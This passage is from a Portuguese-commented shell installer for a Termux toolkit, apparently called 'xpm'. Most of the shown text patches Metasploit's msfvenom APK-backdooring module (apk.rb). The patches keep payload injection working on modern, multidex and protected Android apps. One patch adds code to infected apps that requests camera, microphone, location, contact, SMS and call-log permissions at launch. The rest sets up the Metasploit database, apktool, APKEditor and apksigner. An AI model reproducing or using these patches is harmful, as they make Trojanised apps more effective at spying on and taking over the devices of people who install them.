new_g = "    # MSF_AE_PAYLOAD_GLOB_V2: apkeditor usa smali/classes/, apktool usa smali/\n    payload_smali_base = Dir.exist?(\"\#{tempdir}/payload/smali/classes\") ? \"\#{tempdir}/payload/smali/classes\" : \"\#{tempdir}/payload/smali\"\n    payload_files = Dir.glob(\"\#{payload_smali_base}/com/metasploit/stage/*.smali\")"
File.write(ARGV[0], src.include?(old) ? src.sub(old, new_g) : src)
RBFIXGLOB
        grep -q 'MSF_AE_PAYLOAD_GLOB_V2' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: payload glob corrigido" || _warn "Fix GLOB nao aplicado"
    fi

    # Fix DIR: supersedido pelo MULTIDEX_V2 — verifica ambos
    if grep -q 'MSF_AE_PAYLOAD_DIR_V2\|MSF_AE_MULTIDEX_V2' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: payload dir ja corrigido"
    else
        _info "apk.rb fix dir: payload dir smali/classes/ path..."
        ruby - "$apkrb" << 'RBFIXDIR'
src = File.read(ARGV[0])
exit 0 if src.include?('MSF_AE_PAYLOAD_DIR_V2')
old = "    payload_dir = \"\#{tempdir}/original/smali/\#{package_slash}/\""
new_d = "    # MSF_AE_PAYLOAD_DIR_V2\n    _orig_smali_base = Dir.exist?(\"\#{tempdir}/original/smali/classes\") ? \"\#{tempdir}/original/smali/classes\" : \"\#{tempdir}/original/smali\"\n    payload_dir = \"\#{_orig_smali_base}/\#{package_slash}/\""
File.write(ARGV[0], src.include?(old) ? src.sub(old, new_d) : src)
RBFIXDIR
        grep -q 'MSF_AE_PAYLOAD_DIR_V2' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: payload dir corrigido" || _warn "Fix DIR nao aplicado"
    fi

    # ── Fix CLASSES_PATH: supersedido pelo FIND_V2 — verifica ambos ────────
    if grep -q 'MSF_AE_CLASSES_PATH\|MSF_AE_FIND_V2' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: classes path ja corrigido"
    else
        _info "apk.rb fix classes_path: adiciona smali*/classes/ na busca do hook..."
        ruby - "$apkrb" << 'RBFIXCP'
src = File.read(ARGV[0])
exit 0 if src.include?('MSF_AE_CLASSES_PATH')
old = '    if smalifile.blank?' + "
" +
      '      raise "Unable to find class file: #{hookable_class_filepath}"' + "
" +
      '    end'
new = '    if smalifile.blank?' + "
" +
      '      # MSF_AE_CLASSES_PATH: APKEditor usa smali/classes/' + "
" +
      '      smalifile = Dir.glob("#{tempdir}/original/smali*/classes/#{hookable_class_filename}").select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "
" +
      '    end' + "
" +
      '    if smalifile.blank?' + "
" +
      '      smalifile = Dir.glob("#{tempdir}/original/smali*/**/#{hookable_class_filename}").select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "
" +
      '    end' + "
" +
      '    if smalifile.blank?' + "
" +
      '      raise "Unable to find class file: #{hookable_class_filepath}"' + "
" +
      '    end'
src = src.sub(old, new) if src.include?(old)
File.write(ARGV[0], src)
RBFIXCP
        grep -q 'MSF_AE_CLASSES_PATH' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: classes path corrigido" || _warn "Fix CLASSES_PATH nao aplicado"
    fi

    # ── Fix NONST_FIX_V2: copia toda arvore com/metasploit/ exceto stage/ ────
    if grep -q 'MSF_AE_NONST_FIX_V2' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: non-stage classes ja corrigido (V2)"
    else
        _info "apk.rb fix nonst_v2: copia com/metasploit/** recursivo exceto stage/..."
        ruby - "$apkrb" << 'RBFIXNS'
src = File.read(ARGV[0])
exit 0 if src.include?('MSF_AE_NONST_FIX_V2')
old = '    FileUtils.mkdir_p payload_dir' + "

" +
      '    # Copy over the payload files'
new = '    FileUtils.mkdir_p payload_dir' + "

" +
      '    # MSF_AE_NONST_FIX_V2: copia toda arvore com/metasploit/ exceto stage/' + "
" +
      '    Dir.glob("#{payload_smali_base}/com/metasploit/**/*.smali").each do |_nsf|' + "
" +
      '      next if _nsf.include?("/com/metasploit/stage/")' + "
" +
      '      _rel = _nsf.sub("#{payload_smali_base}/", "")' + "
" +
      '      _dest = "#{_orig_smali_base}/#{_rel}"' + "
" +
      '      FileUtils.mkdir_p(File.dirname(_dest))' + "
" +
      '      _nc = File.binread(_nsf)' + "
" +
      "      _nc.gsub!('com/metasploit/stage', package_slash)" + "
" +
      '      File.open(_dest, "wb") { |f| f.puts _nc }' + "
" +
      '    end' + "

" +
      '    # Copy over the payload files'
src = src.sub(old, new) if src.include?(old)
File.write(ARGV[0], src)
RBFIXNS
        grep -q 'MSF_AE_NONST_FIX_V2' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: non-stage classes corrigido (V2)" || _warn "Fix NONST_V2 nao aplicado"
    fi

    # ── Fix FALLBACK_ACTIVITY: quando Application smali nao existe, usa launcher Activity ─
    if grep -q 'MSF_AE_FALLBACK_ACTIVITY' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: fallback launcher Activity ja configurado"
    else
        _info "apk.rb fix fallback_activity: fallback para launcher Activity quando app protegido..."
        ruby - "$apkrb" << 'RBFIXFA'
src = File.read(ARGV[0])
exit 0 if src.include?('MSF_AE_FALLBACK_ACTIVITY')
old = '    if smalifile.blank?' + "
" +
      '      raise "Unable to find hookable smali (tried Application class and launcher Activity)"' + "
" +
      '    end'
# Se ja tem o bloco de fallback activity, nao precisa adicionar de novo
unless src.include?('MSF_AE_FALLBACK_ACTIVITY') || src.include?('tentando launcher Activity')
  old2 = '    if smalifile.blank?' + "
" +
         '      raise "Unable to find class file: #{hookable_class_filename} in #{tempdir}/original/"' + "
" +
         '    end'
  new2 = '    # MSF_AE_FALLBACK_ACTIVITY: app protegido? tenta launcher Activity' + "
" +
         '    if smalifile.blank?' + "
" +
         '      print_status "Application class smali nao encontrado (app protegido?), tentando launcher Activity...
"' + "
" +
         '      _activities = amanifest.xpath("//activity|//activity-alias")' + "
" +
         '      _pkg = amanifest.xpath("//manifest").first["package"]' + "
" +
         '      _activities.each do |_act|' + "
" +
         '        _aname = _act.attribute("targetActivity").to_s' + "
" +
         '        _aname = _act.attribute("name").to_s if _aname.blank?' + "
" +
         '        next if _aname.blank?' + "
" +
         '        _cats = _act.search("category")' + "
" +
         '        next unless _cats.any? { |c| ["android.intent.category.LAUNCHER","android.intent.action.MAIN"].include?(c.attribute("name").to_s) }' + "
" +
         '        _aname = _pkg + _aname if _aname.start_with?(".")' + "
" +
         '        _afname = _aname.gsub(".", "/") + ".smali"' + "
" +
         '        smalifile = Dir.glob("#{tempdir}/original/**/" + _afname).select { |f| File.readable?(f) }.flatten.first' + "
" +
         '        break unless smalifile.blank?' + "
" +
         '      end' + "
" +
         '    end' + "
" +
         '    if smalifile.blank?' + "
" +
         '      raise "Unable to find hookable smali (tried Application class and launcher Activity)"' + "
" +
         '    end'
  src = src.sub(old2, new2) if src.include?(old2)
end
File.write(ARGV[0], src)
RBFIXFA
        grep -q 'MSF_AE_FALLBACK_ACTIVITY' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: fallback launcher Activity configurado" || _warn "Fix FALLBACK_ACTIVITY nao aplicado"
    fi

    # ── Fix MULTIDEX_V2: payload no ultimo classes/ para evitar overflow 64K ──
    if grep -q 'MSF_AE_MULTIDEX_V2' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: multidex payload ja configurado (V2)"
    else
        _info "apk.rb fix multidex_v2: payload no ultimo classes/ (evita overflow 64K)..."
        ruby - "$apkrb" << 'RBFIXMX'
src = File.read(ARGV[0])
exit 0 if src.include?('MSF_AE_MULTIDEX_V2')
old = '    # MSF_AE_PAYLOAD_DIR_V2' + "
" +
      '    _orig_smali_base = Dir.exist?("#{tempdir}/original/smali/classes") ? "#{tempdir}/original/smali/classes" : "#{tempdir}/original/smali"' + "
" +
      '    payload_dir = "#{_orig_smali_base}/#{package_slash}/"'
new = '    # MSF_AE_MULTIDEX_V2: payload no ultimo classes/ para evitar overflow 64K' + "
" +
      '    _smali_root = "#{tempdir}/original/smali"' + "
" +
      '    _classes_dirs = Dir.glob("#{_smali_root}/classes*/").sort' + "
" +
      '    if _classes_dirs.empty?' + "
" +
      '      _orig_smali_base = Dir.exist?("#{_smali_root}/classes") ? "#{_smali_root}/classes" : _smali_root' + "
" +
      '    else' + "
" +
      '      _orig_smali_base = _classes_dirs.last.chomp("/")' + "
" +
      '    end' + "
" +
      '    payload_dir = "#{_orig_smali_base}/#{package_slash}/"'
src = src.sub(old, new) if src.include?(old)
File.write(ARGV[0], src)
RBFIXMX
        grep -q 'MSF_AE_MULTIDEX_V2' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: multidex payload configurado" || _warn "Fix MULTIDEX_V2 nao aplicado"
    fi

    # ── Fix RUNTIME_PERMS_V1: requestPermissions() em runtime — Android 6+ (API 23) ──
    # Problema: msfvenom injeta permissoes no AndroidManifest mas nao gera codigo
    # Smali para solicitá-las em runtime. No Android 6+, permissoes "dangerous"
    # precisam de requestPermissions() — so estar no manifesto nao basta.
    # Fix: adiciona metodo requestAllPerms() no smali do launcher Activity e
    # injeta a chamada em onCreate(), logo apos super.onCreate().
    # Idempotente (marcador MSF_AE_RUNTIME_PERMS_V1).
    if grep -q 'MSF_AE_RUNTIME_PERMS_V1' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: runtime permissions ja configuradas (V1)"
    else
        _info "apk.rb fix runtime_perms_v1: requestPermissions() no launcher Activity..."
        ruby - "$apkrb" << 'RBFIXRP'
src = File.read(ARGV[0])
exit 0 if src.include?('MSF_AE_RUNTIME_PERMS_V1')

# Constroi o codigo Ruby do metodo que sera injetado no apk.rb
pm = ""
pm << "\n"
pm << "  # MSF_AE_RUNTIME_PERMS_V1 — Android 6+: requestPermissions() no launcher Activity\n"
pm << "  # Chamado em backdoor_apk antes do rebuild para injetar o dialogo de permissoes\n"
pm << "  def _ae_inject_runtime_perms(tempdir, manifest_doc)\n"
pm << "    perms_all = %w[\n"
pm << "      android.permission.READ_EXTERNAL_STORAGE\n"
pm << "      android.permission.WRITE_EXTERNAL_STORAGE\n"
pm << "      android.permission.RECORD_AUDIO\n"
pm << "      android.permission.CAMERA\n"
pm << "      android.permission.ACCESS_FINE_LOCATION\n"
pm << "      android.permission.ACCESS_COARSE_LOCATION\n"
pm << "      android.permission.READ_CONTACTS\n"
pm << "      android.permission.READ_CALL_LOG\n"
pm << "      android.permission.READ_SMS\n"
pm << "      android.permission.PROCESS_OUTGOING_CALLS\n"
pm << "      android.permission.RECEIVE_SMS\n"
pm << "      android.permission.GET_ACCOUNTS\n"
pm << "    ]\n"
pm << "\n"
pm << "    # Filtra: apenas permissoes que o msfvenom ja declarou no manifesto\n"
pm << "    declared = manifest_doc.xpath('//uses-permission').map { |p|\n"
pm << "      p.attribute('name').to_s\n"
pm << "    }.reject(&:empty?)\n"
pm << "    perms = perms_all.select { |p| declared.include?(p) }\n"
pm << "    return if perms.empty?\n"
pm << "\n"
pm << "    # Localiza o launcher Activity (mesmo padrao do MSF_AE_FALLBACK_ACTIVITY)\n"
pm << "    _pkg = manifest_doc.xpath('//manifest').first['package'].to_s\n"
pm << "    launcher = nil\n"
pm << "    manifest_doc.xpath('//activity|//activity-alias').each do |act|\n"
pm << "      _aname = act.attribute('targetActivity').to_s\n"
pm << "      _aname = act.attribute('name').to_s if _aname.blank?\n"
pm << "      next if _aname.blank?\n"
pm << "      _cats = act.search('category')\n"
pm << "      _acts = act.search('action')\n"
pm << "      has_l = _cats.any? { |c| c.attribute('name').to_s.include?('LAUNCHER') }\n"
pm << "      has_m = _acts.any? { |a| a.attribute('name').to_s.include?('MAIN') }\n"
pm << "      next unless has_l && has_m\n"
pm << "      _aname = _pkg + _aname if _aname.start_with?('.')\n"
pm << "      launcher = _aname\n"
pm << "      break\n"
pm << "    end\n"
pm << "    return if launcher.nil? || launcher.empty?\n"
pm << "\n"
pm << "    # Encontra o smali do launcher Activity (APKEditor: smali/classes/**)\n"
pm << "    fname = launcher.gsub('.', '/') + '.smali'\n"
pm << "    sfile = Dir.glob(\"\#{tempdir}/original/**/\#{fname}\")\n"
pm << "                 .select { |f| File.readable?(f) && !File.symlink?(f) }.first\n"
pm << "    return unless sfile\n"
pm << "\n"
pm << "    smali = File.read(sfile)\n"
pm << "    return if smali.include?('MSF_AE_RUNTIME_PERMS_V1')\n"
pm << "\n"
pm << "    cid = launcher.gsub('.', '/')\n"
pm << "    n   = perms.size\n"
pm << "\n"
pm << "    # Constroi as linhas Smali do array de permissoes\n"
pm << "    arr_lines = perms.each_with_index.map { |p, i|\n"
pm << "      ri = i < 16 ? \"const/4 v1, 0x\#{i.to_s(16)}\" : \"const/16 v1, 0x\#{i.to_s(16)}\"\n"
pm << "      \"    \#{ri}\\n    const-string v2, \\\"\#{p}\\\"\\n    aput-object v2, v0, v1\"\n"
pm << "    }.join(\"\\n\\n\")\n"
pm << "\n"
pm << "    meth_smali =\n"
pm << "      \"\\n# MSF_AE_RUNTIME_PERMS_V1\\n\" \\\n"
pm << "      \".method private requestAllPerms()V\\n\" \\\n"
pm << "      \"    .registers 4\\n\\n\" \\\n"
pm << "      \"    const/16 v0, 0x\#{n.to_s(16)}\\n\" \\\n"
pm << "      \"    new-array v0, v0, [Ljava/lang/String;\\n\\n\" \\\n"
pm << "      \"\#{arr_lines}\\n\\n\" \\\n"
pm << "      \"    const/16 v1, 0x1337\\n\" \\\n"
pm << "      \"    invoke-virtual {p0, v0, v1}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V\\n\\n\" \\\n"
pm << "      \"    return-void\\n\" \\\n"
pm << "      \".end method\\n\"\n"
pm << "\n"
pm << "    # Injeta o metodo antes do bloco virtual methods (ou no final)\n"
pm << "    if smali.include?('# virtual methods')\n"
pm << "      smali = smali.sub('# virtual methods', meth_smali + \"\\n# virtual methods\")\n"
pm << "    elsif smali.include?('# direct methods')\n"
pm << "      smali = smali.sub('# direct methods', meth_smali + \"\\n# direct methods\")\n"
pm << "    else\n"
pm << "      smali += \"\\n\" + meth_smali\n"
pm << "    end\n"
pm << "\n"
pm << "    # Injeta chamada em onCreate logo apos invoke-super onCreate\n"
pm << "    call_inj = \"    invoke-direct {p0}, L\#{cid};->requestAllPerms()V\\n\"\n"
pm << "    smali = smali.gsub(\n"
pm << "      /(\\.method[^\\n]*\\bonCreate\\b[^\\n]*\\n(?:(?!\\.end method)[^\\n]*\\n)*?[ \\t]*invoke-super[^\\n]*\\bonCreate\\b[^\\n]*\\n)/\n"
pm << "    ) do |blk|\n"
pm << "      blk.include?('requestAllPerms') ? blk : blk + call_inj\n"
pm << "    end\n"
pm << "\n"
pm << "    File.write(sfile, smali)\n"
pm << "  rescue => _rp_err\n"
pm << "    # silencioso — nao interrompe o msfvenom se o inject falhar\n"
pm << "  end\n"

# 1. Adiciona o metodo antes de def backdoor_apk
if src.include?('  def backdoor_apk')
  src = src.sub('  def backdoor_apk', pm.rstrip + "\n\n  def backdoor_apk")
end

# 2. Injeta a chamada antes do run_cmd de rebuild (apktool b)
# Ancora: primeiro run_cmd contendo 'b' ou "b" como argumento (o rebuild step)
call_line = "    _ae_inject_runtime_perms(tempdir, amanifest) # MSF_AE_RUNTIME_PERMS_V1\n"
unless src.include?('MSF_AE_RUNTIME_PERMS_V1')
  rebuilt = src.sub(/(?=[ \t]*run_cmd\(\[[^\]]*(?:'b'|"b")[^\]]*\])/) { call_line }
  src = rebuilt
end

File.write(ARGV[0], src)
RBFIXRP
        grep -q 'MSF_AE_RUNTIME_PERMS_V1' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: runtime permissions configuradas (V1)" \
            || _warn "Fix RUNTIME_PERMS_V1 nao aplicado (anchor run_cmd 'b' nao encontrado — apk.rb pode ter estrutura diferente)"
    fi
}

# Garante que o banco de dados do Metasploit existe e esta rodando.
# Chamada tanto na instalacao (_backend_msf) quanto pelo "xpm doctor",
# entao precisa ser idempotente (seguro rodar varias vezes).
_msf_init_database() {
    local BPFX="$1" gems="$2" gdp="$3" dest="$4"
    local msfdb_bin="$BPFX/bin/msfdb"

    [ -x "$msfdb_bin" ] || { _warn "msfdb nao encontrado em $msfdb_bin — pulando init do banco"; return 1; }

    # postgresql (binarios initdb/pg_ctl/psql) e obrigatorio pro msfdb
    # conseguir subir o cluster local. Ja e instalado como dependencia
    # nativa, mas garante de novo aqui caso o usuario tenha removido.
    command -v pg_ctl &>/dev/null || pkg install -y postgresql 2>/dev/null || true

    # diretorio onde o msfdb guarda o socket/pid do postgres — em algumas
    # instalacoes do Termux esse diretorio nao existe ainda, e o postgres
    # falha silenciosamente ao tentar escrever o socket la
    mkdir -p "$BPFX/var/run/postgresql" 2>/dev/null || true

    _info "Verificando banco de dados do Metasploit..."
    local status_out
    status_out=$("$msfdb_bin" status 2>&1)

    if echo "$status_out" | grep -qiE "no database found|not (found|initialized)|does not exist"; then
        _info "Banco nao inicializado — rodando 'msfdb --use-defaults init' (pode levar 1-2min)..."
        local init_out
        init_out=$("$msfdb_bin" --use-defaults init 2>&1)
        echo "$init_out" | tail -20

        if echo "$init_out" | grep -qiE "error|failed|falha"; then
            _warn "msfdb init reportou erros. Rode manualmente: msfdb --use-defaults init"
        else
            _ok "Banco de dados do Metasploit inicializado"
        fi
    else
        _ok "Banco de dados ja inicializado"
    fi

    # Garante que o servico esta de pe (init nao inicia o servico sozinho
    # em todo mundo das versoes do msfdb)
    "$msfdb_bin" start 2>&1 | tail -10

    if "$msfdb_bin" status 2>&1 | grep -qiE "running|started|active|success|already"; then
        _ok "Servico de banco de dados do Metasploit ativo"
        return 0
    else
        _warn "Nao foi possivel confirmar que o banco esta ativo."
        _warn "Rode manualmente: msfdb --use-defaults init && msfdb start"
        return 1
    fi
}

# Remove do checkout do metasploit-framework tudo que é 100% dev/CI e nunca
# é lido em runtime pelo msfconsole/msfvenom/msfrpc: docs/spec/test/.github.
# Fonte: doc oficial "Navigating the codebase" da Rapid7 — spec/ é suíte
# RSpec, test/ é teste de infra, docs/ é o site docs.metasploit.com, .github/
# é workflow de CI. Tudo o mais (lib/ modules/ data/ config/ plugins/
# scripts/ db/ external/ tools/ app/ e qualquer coisa nova que o upstream
# adicionar no futuro) fica intacto — nenhum módulo, exploit, payload ou
# encoder é removido.
#
# IMPORTANTE: a lista de exclusão é feita por EXCLUSÃO explícita
# (sparse-checkout --no-cone com padrões "/*" + "!/pasta/"), não por
# inclusão explícita. Isso é proposital: uma lista de inclusão exige
# adivinhar TODAS as pastas que o framework precisa, e esquecer uma (ex.:
# "app/", que a gem metasploit_data_models exige pra achar
# ApplicationRecord) quebra o msfconsole com erro tipo "uninitialized
# constant ApplicationRecord". Com exclusão, só as 5 pastas realmente
# inúteis somem; qualquer pasta nova que a Rapid7 adicionar num release
# futuro continua sendo baixada normalmente.
#
# Depois de aplicar, a poda SOBREVIVE a um "xpm update metasploit" (git
# pull): o sparse-checkout deixa registrado no git que essas pastas ficam
# de fora de propósito, então um pull só atualiza o índice sem tentar
# materializar arquivo nenhum ali — zero risco do conflito "modify/delete"
# que aconteceria se a gente só tivesse dado rm -rf sem avisar o git.
#
# Idempotente: seguro rodar de novo em instalação já otimizada (silencioso).
# Chamada tanto por _backend_msf (instalação nova) quanto por xpm doctor
# (injeta em instalação antiga que não tinha a otimização, e também
# CONSERTA uma instalação que ficou com a lista de inclusão antiga/quebrada)
# e por _update_one (reaplica depois de um "xpm update metasploit").
_msf_optimize_files() {
    local dest="$1"
    [ -d "$dest" ] || return 1

    # Já otimizado, sem sobra de dev/CI, E com app/ presente (garante que
    # uma instalação que ficou quebrada pela versão antiga desta função,
    # que usava lista de inclusão e apagava app/ por engano, seja
    # reparada em vez de ser considerada "já ok")? Só pula se tudo bater.
    if [ -f "$dest/.xpm-optimized" ] && [ ! -d "$dest/spec" ] && [ ! -d "$dest/docs" ] \
        && [ ! -d "$dest/documentation" ] && [ ! -d "$dest/test" ] && [ ! -d "$dest/.github" ] \
        && [ -d "$dest/app" ] && [ -d "$dest/lib" ]; then
        return 0
    fi

    local before after saved
    before=$(du -sm "$dest" 2>/dev/null | cut -f1)
    [ -n "$before" ] || before=0

    _info "Otimizando metasploit-framework (removendo docs/spec/test/.github — módulos, exploits, payloads e todo o resto do framework NÃO são tocados)..."

    local _sparse_ok=0
    if [ -d "$dest/.git" ]; then
        # --no-cone: modo de padrões gitignore-style, permite excluir só o
        # que a gente quer e manter tudo o mais incluído por padrão via "/*".
        if (cd "$dest" && git sparse-checkout init --no-cone 2>/dev/null) \
            && (cd "$dest" && git sparse-checkout set --no-cone \
                '/*' '!/docs/' '!/documentation/' '!/spec/' '!/test/' '!/.github/' 2>/dev/null); then
            _sparse_ok=1
            _ok "sparse-checkout (exclusão) ativo — poda sobrevive a 'xpm update metasploit' e não quebra pastas novas"
            # O git remove os ARQUIVOS de dentro das pastas excluídas, mas
            # não apaga a pasta vazia que sobra. Cosmético, mas limpa mesmo
            # assim (rmdir só funciona se estiver realmente vazia).
            local d
            for d in docs documentation spec test .github; do
                [ -d "$dest/$d" ] && rmdir "$dest/$d" 2>/dev/null || true
            done
        else
            _warn "git desta instalação não suporta sparse-checkout — aplicando poda manual (pode ser restaurada por um 'xpm update'; rode 'xpm doctor' se isso acontecer)"
        fi
    fi

    # Fallback manual — só necessário se o sparse-checkout acima falhou
    # (git antigo) ou se não há .git (instalação sem histórico git).
    if [ "$_sparse_ok" -eq 0 ]; then
        local d
        for d in docs documentation spec test .github; do
            [ -d "$dest/$d" ] && rm -rf "$dest/$d"
        done
    fi

    local f
    for f in CONTRIBUTING.md CODE_OF_CONDUCT.md .rspec .rubocop.yml .rubocop_todo.yml .yardopts; do
        [ -f "$dest/$f" ] && rm -f "$dest/$f"
    done

    touch "$dest/.xpm-optimized" 2>/dev/null || true

    after=$(du -sm "$dest" 2>/dev/null | cut -f1)
    [ -n "$after" ] || after=0
    saved=$(( before - after ))
    if [ "$saved" -gt 0 ]; then
        _ok "Otimização concluída: ${saved}MB removidos (${before}MB → ${after}MB)"
    else
        _ok "Otimização concluída"
    fi

    if [ ! -d "$dest/app" ]; then
        _warn "app/ ainda ausente após a otimização — algo além do esperado removeu essa pasta. Rode: cd $dest && git sparse-checkout disable"
    fi
}

_backend_npm() {
    local pkg="$1"
    _info "Instalando via npm: $pkg"
    command -v npm &>/dev/null || pkg install -y nodejs || _die "npm não encontrado. Instale nodejs: pkg install nodejs"
    npm install -g "$pkg" || _die "Falha ao instalar $pkg via npm"
}


# ── apktool ────────────────────────────────────────────────────────────────
# Não existe pacote no repo do Termux, então baixamos o .jar direto da última
# release no GitHub e criamos um wrapper próprio (não dependemos do formato
# interno do script oficial, que muda de versão pra versão).
_backend_apktool() {
    # apktool puro via pkg — SEM wrapper, compatível com msfvenom -x
    _info "Instalando apktool..."
    pkg reinstall -y apktool 2>/dev/null || pkg install -y apktool 2>/dev/null || true
    hash -r 2>/dev/null || true
    if command -v apktool >/dev/null 2>&1; then
        _ok "apktool instalado: $(apktool --version 2>/dev/null | head -1)"
    else
        _warn "apktool não encontrado — verifique o repo do Termux"
    fi
    [ -f "$HOME/.local/bin/apktool" ] && rm -f "$HOME/.local/bin/apktool" && _ok "wrapper V1 legado removido"
}


# ── backend apkfull — kit completo de ferramentas APK ──────────────────────
_backend_apkfull() {
    # 1. APKEditor (tur-repo + fallback JAR) — suporte a APKs modernos
    _backend_apkeditor

    # 2. apksigner + aapt + aapt2 + apkeep
    _info "Instalando apksigner, aapt, aapt2, apkeep..."
    pkg install -y apksigner aapt aapt2 apkeep 2>/dev/null || true

    # wrapper apksigner caso venha como JAR sem binário
    if ! command -v apksigner >/dev/null 2>&1; then
        local _ks_jar="${PREFIX:-/data/data/com.termux/files/usr}/share/java/apksigner.jar"
        if [ -f "$_ks_jar" ]; then
            printf '#!/bin/sh\nexec java -jar %s "$@"\n' "$_ks_jar" \
                > "${PREFIX:-/data/data/com.termux/files/usr}/bin/apksigner"
            chmod +x "${PREFIX:-/data/data/com.termux/files/usr}/bin/apksigner"
            _ok "apksigner wrapper criado"
        else
            _warn "apksigner.jar não encontrado — assinar APKs pode falhar"
        fi
    fi

    # 2b. wrapper anti-idsig — remove .idsig gerado automaticamente após cada assinatura
    _apksigner_wrap_idsig

    # 3. Keystore EC P-256 (usada por ms --apk e appforge)
    local _ks_dir="$HOME/.xpm/tools/apktool"
    local _ks="$_ks_dir/xpm-compat-test.keystore"
    mkdir -p "$_ks_dir"
    if [ ! -f "$_ks" ] && command -v keytool >/dev/null 2>&1; then
        keytool -genkeypair -storepass xpm-compat-test -keypass xpm-compat-test \
            -alias xpm-compat-test -keyalg EC -groupname secp256r1 -validity 10000 \
            -dname "CN=ElliotOS XPM Compat Test,O=ElliotOS,C=BR" -deststoretype pkcs12 \
            -keystore "$_ks" >/dev/null 2>&1 \
            && _ok "Keystore EC P-256 gerada" \
            || _warn "keytool falhou — rode xpm doctor pra tentar novamente"
    fi

    # 4. apkinspect — análise estática de APK (sem pip)
    _backend_apkinspect

    # 5. appforge — converte HTML/JS/CSS em APK real
    _backend_appforge
}


# ── apksigner anti-idsig wrapper ─────────────────────────────────────────────
# Substitui o binário apksigner por um wrapper shell que:
#   1. Delega tudo para apksigner.real (o binário/script original)
#   2. Após a assinatura, remove qualquer <apk>.idsig gerado no processo
# Idempotente: detecta pelo marcador ELLIOTOS_NO_IDSIG e não sobrescreve.
# ─────────────────────────────────────────────────────────────────────────────
_apksigner_wrap_idsig() {
    local _BIN _REAL

    command -v apksigner >/dev/null 2>&1 || {
        _warn "apksigner não disponível — wrapper anti-idsig não instalado"
        return 0
    }

    _BIN="$(command -v apksigner)"
    _REAL="$(dirname "$_BIN")/apksigner.real"

    # Idempotência: não sobrescreve se o wrapper já foi instalado
    if grep -q "ELLIOTOS_NO_IDSIG" "$_BIN" 2>/dev/null; then
        _ok "apksigner wrapper anti-idsig já instalado"
        return 0
    fi

    # Preserva o binário/script real
    cp "$_BIN" "$_REAL" 2>/dev/null || {
        _warn "Não foi possível salvar apksigner.real — wrapper não instalado"
        return 0
    }
    chmod +x "$_REAL"

    # Escreve o wrapper no lugar do binário original
    cat > "$_BIN" << 'APKSIGNER_NO_IDSIG_WRAPPER'
#!/bin/sh
# ELLIOTOS_NO_IDSIG — wrapper ElliotOS para apksigner
# Chama apksigner.real e remove o .idsig gerado após cada assinatura.
_SELF="$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || echo "$0")"
_REAL_BIN="$(dirname "$_SELF")/apksigner.real"
"$_REAL_BIN" "$@"
_rc=$?
# apksigner gera <apk>.idsig para cada APK assinado — remove automaticamente
for _a in "$@"; do
    [ -f "${_a}.idsig" ] && rm -f "${_a}.idsig"
done
exit $_rc
APKSIGNER_NO_IDSIG_WRAPPER
    chmod +x "$_BIN"
    _ok "apksigner wrapper anti-idsig instalado — .idsig removido automaticamente após assinar"
}


# ── backend apkeditor — APKEditor (decode/rebuild moderno para uso manual) ──
_backend_apkeditor() {
    local _APKEDITOR_JAR="$HOME/.xpm/tools/apkeditor/APKEditor.jar"
    local _APKEDITOR_BIN="${PREFIX:-/data/data/com.termux/files/usr}/bin/apkeditor"

    # tenta via tur-repo primeiro
    if ! command -v apkeditor >/dev/null 2>&1; then
        _info "Ativando tur-repo e instalando APKEditor..."
        if pkg install -y tur-repo 2>/dev/null && pkg update -y 2>/dev/null; then
            pkg install -y apkeditor 2>/dev/null || true
        fi
    fi

    # fallback: baixa o JAR diretamente do GitHub releases
    if ! command -v apkeditor >/dev/null 2>&1; then
        _info "tur-repo não tem apkeditor — baixando JAR do GitHub..."
        mkdir -p "$(dirname "$_APKEDITOR_JAR")"
        local _url
        _url="$(curl -sfL https://api.github.com/repos/REAndroid/APKEditor/releases/latest             | grep 'browser_download_url.*APKEditor.*\.jar"'             | head -1 | cut -d'"' -f4)"
        if [ -n "$_url" ]; then
            curl -L -o "$_APKEDITOR_JAR" "$_url" 2>/dev/null                 && _ok "APKEditor.jar baixado"                 || { _warn "Download do APKEditor.jar falhou"; return 1; }
            # cria wrapper shell
            printf '#!/bin/sh
exec java -jar "%s" "$@"
' "$_APKEDITOR_JAR" > "$_APKEDITOR_BIN"
            chmod +x "$_APKEDITOR_BIN"
            _ok "apkeditor wrapper criado em $_APKEDITOR_BIN"
        else
            _warn "Não consegui encontrar URL do APKEditor — instale manualmente:"
            _warn "  pkg install tur-repo && pkg install apkeditor"
            return 1
        fi
    fi

    if command -v apkeditor >/dev/null 2>&1; then
        _ok "APKEditor disponível: $(apkeditor -version 2>/dev/null | head -1)"
        printf "\n  Uso:\n"
        printf "    apkeditor d -i app.apk            # desmonta\n"
        printf "    apkeditor b -i pasta/ -o out.apk  # reconstrói\n"
        printf "    apkeditor m -i app.xapk -o base.apk # extrai XAPK/APKS\n"
        printf "    apkeditor x -i app.apk             # refatora nomes obfuscados\n"
        printf "  Após rebuild, assine com:\n"
        printf "    apksigner sign --ks ~/.xpm/tools/apktool/xpm-compat-test.keystore \\\n"
        printf "      --ks-key-alias xpm-compat-test --ks-pass pass:xpm-compat-test out.apk\n"
    fi
}




# ═══════════════════════════════════════════════════════════════════════════════
# LEITURA DO BANCO DE DADOS
# ═══════════════════════════════════════════════════════════════════════════════

_db_get() {
    # _db_get <nome> <campo>
    local file="$XPM_DB/${1}.tool"
    [ -f "$file" ] || return 1
    grep "^${2}=" "$file" | cut -d= -f2-
}

_db_exists() { [ -f "$XPM_DB/${1}.tool" ]; }

_db_list_all() {
    for f in "$XPM_DB"/*.tool; do
        [ -f "$f" ] || continue
        basename "$f" .tool
    done
}

_is_installed() {
    [ -f "$XPM_INSTALLED/${1}.installed" ]
}

_mark_installed() {
